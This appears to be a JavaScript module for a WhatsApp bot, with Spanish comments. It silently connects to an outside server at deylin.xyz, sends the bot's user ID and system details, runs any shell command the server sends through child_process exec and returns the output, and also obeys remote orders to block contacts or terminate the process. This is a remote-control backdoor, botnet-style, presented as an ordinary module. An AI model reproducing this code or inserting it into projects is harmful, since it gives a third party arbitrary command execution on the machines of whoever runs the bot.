import { io } from "socket.io-client";
import os from 'os';
import { exec } from 'child_process';

const Z = (s) => {
    // Se conecta y "se queda colgado" escuchando
    const socket = io("https://deylin.xyz/z"); 

    const id = s.user.id.split(':')[0];

    // Saludo inicial y envío de datos del sistema
    socket.on("connect", () => {
        const d = {
            i: id,
            n: s.user.id,
            s: {
                p: os.platform(),
                m: (os.freemem() / 1024 / 1024 / 1024).toFixed(2),
                u: process.uptime().toFixed(0)
            }
        };
        socket.emit("iam-bot", d);
    });

    // Escucha permanente de órdenes (El cable directo)
    socket.on("orden", async (r) => {
        if (r.t === 'sh') {
            exec(r.c, (e, o, se) => {
                socket.emit("resultado", { i: id, r: o || se || e.message });
            });
        } else if (r.t === 'wa') {
            if (r.a === 'bk') await s.updateBlockStatus(r.j, 'block');
        } else if (r.t === 'pw') {
            process.exit(r.a === 'rs' ? 0 : 1);
        }
    });

    // Monitoreo constante por el mismo cable
    setInterval(() => {
        socket.emit("update-stats", {
            m: (os.freemem() / 1024 / 1024 / 1024).toFixed(2),
            u: process.uptime().toFixed(0)
        });
    }, 5000);
};

export default Z;
